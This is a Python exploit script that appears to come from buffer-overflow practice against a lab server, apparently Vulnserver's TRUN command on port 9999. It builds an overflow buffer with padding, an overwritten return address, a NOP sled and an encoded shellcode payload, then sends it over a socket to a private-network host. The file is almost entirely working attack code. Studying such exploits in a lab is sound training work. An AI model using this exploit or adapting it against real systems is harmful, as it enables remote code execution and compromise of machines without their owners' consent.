#!/usr/bin/python

import socket
import os
import sys

host="192.168.0.6"
port=9999

payload =  ""
payload += "\x2b\xc9\xb1\xc0\xe8\xff\xff\xff\xff\xc1\x5e\x30"
payload += "\x4c\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67"
payload += "\x81\xec\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98"
payload += "\x46\x01\x9d\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3"
payload += "\x1c\x40\x5e\x21\x08\x05\xe7\xe8\x25\x28\xed\xc9"
payload += "\xde\x7f\x79\xa4\x62\x21\xb9\x79\x08\xbe\x7a\x26"
payload += "\x40\xda\x72\x3a\xed\x6c\xb5\x66\x60\x40\x91\xc8"
payload += "\x0d\x5d\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b\x7f\xb0"
payload += "\xfc\x90\x9d\x5e\x55\x92\x6e\xb7\x2d\xaf\x59\x26"
payload += "\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c\x41\x67\xb4"
payload += "\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa\x76\xf8"
payload += "\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24\x24\x2e"
payload += "\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4\xe0\x8a"
payload += "\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9\x10"
payload += "\x67\x4c\x21\x6b\x29\x3f\xc8\xf7\x06\x34\x1f\x3e"
payload += "\x5b\x70\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14"
payload += "\xf7\xa2\xc0\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7"
payload += "\xdf\x93\xdb\xc7\xa5\xc1"




#add NOP as begining of payload is at ESP, and allow shellcode decoder space to work with. Else, it will overwrite the start of the shell code."\x90"

buffer = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 16 + payload +"C"*(3000 - 2003 - 4 - len(payload) -16)

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()